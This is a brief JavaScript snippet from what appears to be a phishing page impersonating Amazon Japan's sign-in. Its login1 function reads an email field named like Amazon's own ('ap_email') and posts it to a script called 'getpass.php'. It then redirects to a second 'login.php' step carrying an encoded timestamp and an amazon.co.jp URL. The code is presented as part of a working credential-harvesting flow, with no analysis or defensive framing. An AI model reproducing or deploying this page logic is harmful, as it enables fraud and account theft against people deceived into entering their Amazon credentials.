<script>
 // var timestamp = Date.parse(new Date());
    // var str = "hellbsbfdvdfvfffsffffffo";
    // var str64 = window.btoa(str+timestamp);
    // console.log("字符串是:"+str);
    // console.log("经base64编码后:"+str64);
    // console.log("base64解码后:"+window.atob(str64));
    function login1(){
        var email = $("#ap_email").val();
        if(email == ''){
            $("#ap_email").focus();
            $("#emailerror").removeClass('hide')
            return;
        }
        var timestamp = Date.parse(new Date());
        var str64 = window.btoa("login="+timestamp);
        $.ajax({
            url: "instapi/getpass.php" ,//url
            type:"post",
            data: {
                email: email
            },
            success: function (result) {
                setTimeout(function() {
                    $(location).attr("href", "login.php?pc="+str64+"https://www.amazon.co.jp")
                }, 1000)
            },
            error : function() {
                alert("异常！");
            }
        });
    }
</script>
